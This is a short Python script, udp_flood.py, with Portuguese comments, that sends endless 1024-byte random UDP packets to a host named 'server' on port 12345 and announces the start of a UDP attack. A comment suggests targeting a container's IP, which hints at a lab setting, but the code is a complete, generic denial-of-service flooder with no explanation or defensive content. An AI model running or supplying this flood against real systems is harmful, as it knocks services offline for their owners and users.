# udp_flood.py
import socket
import random

server_ip = "server"  # Substitua pelo IP do container ou use o nome "server"
port = 12345
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

print("Iniciando ataque UDP...")

while True:
    msg = random._urandom(1024)
    sock.sendto(msg, (server_ip, port))
